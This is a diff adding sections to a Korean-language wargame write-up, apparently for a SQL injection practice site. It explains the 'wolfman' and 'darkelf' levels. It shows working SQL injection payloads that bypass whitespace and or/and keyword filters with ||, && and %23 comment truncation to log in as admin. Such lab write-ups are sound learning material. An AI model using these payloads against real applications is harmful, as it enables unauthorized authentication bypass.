@@ -21,4 +21,24 @@ python을 이용해 돌려주면 pw는 095a9852 것이 나온다!!<br><br>
 
 ?pw=095A9852
 
-### #orc#
+### #wolfman#
+if($result['id'] == 'admin') solve("wolfman");<br>
+푸는 조건은 goblin과 같다. id의 값이 admin이면 된다.<br><br>
+
+다만, <br>
+if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); <br>
+공백을 필터링 하기 때문에 or이나 and처럼 string형태로 치면 공백을 사용할 수 없어 그냥 문자열로 입력되어버린다.<br>
+이는 &&나 ||를 이용해 우회가 가능하다. 또한 %23은 #이므로 이를 이용해 주석을 사용해주는 방법 또한 있다.<br>
+주석을 이용해 이 문제를 풀어보면 <br><br>
+
+?pw='||id='admin'%23<br>
+
+### #darkelf#
+
+if($result['id'] == 'admin') solve("darkelf"); <br>
+이 문제 또한 goblin과 wolfman같이 id가 admin이면 해결된다.<br><br>
+
+다만, 이번에는 논리연산자 or과 and가 필터링 되어버린다.<br>
+이 또한 wolfman에서처럼 &&와 ||로 우회가 가능하다.<br><br>
+
+?pw=' || id='admin'%23
